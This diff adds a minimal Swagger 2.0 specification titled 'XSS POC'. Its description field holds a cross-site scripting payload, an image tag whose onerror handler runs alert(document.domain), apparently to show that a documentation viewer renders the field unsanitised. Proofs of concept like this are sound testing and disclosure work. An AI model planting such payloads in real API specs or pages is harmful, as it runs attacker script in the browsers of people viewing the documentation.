@@ -1,0 +1,9 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "description": "<img src=x onerror=alert(document.domain)>",
+    "version": "1.0.0",
+    "title": "XSS POC"
+  },
+  "paths": {}
+}
